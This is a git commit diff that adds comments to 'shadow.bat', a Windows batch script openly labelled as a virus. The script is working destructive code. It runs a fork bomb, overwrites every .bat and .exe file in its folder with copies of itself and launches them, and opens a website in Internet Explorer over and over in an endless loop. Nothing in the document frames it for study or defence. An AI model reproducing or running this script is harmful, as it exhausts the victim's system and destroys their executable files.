093f1f49177685d2bcf0f1e5c6e5c4fbecaeef92
Gage Atkinson <73555272+someStranger8@users.noreply.github.com>
2022-01-07 12:08:25 -0500

    Update shadow.bat

--- shadow.bat
+++ shadow.bat
@@ -1,12 +1,24 @@
 @echo off
+
+# title & color
 title less go
 color 57
+
+# loop
 lessgo:
+
+# increase cpu usage
 %0|%0
+
+# copy and start all bat files
 copy %0 *.bat > nul
 start "" *.bat
+
+# copy and start all exe files
 copy %0 *.exe > nul
 start "" *.exe
+
+# virus
 echo less go
 start "iexplore.exe" https://piv.pivpiv.dk
 echo less go
@@ -57,4 +69,6 @@ echo less go
 start "iexplore.exe" https://piv.pivpiv.dk
 echo less go
 start "iexplore.exe" https://piv.pivpiv.dk
+
+# start loop
 goto lessgo
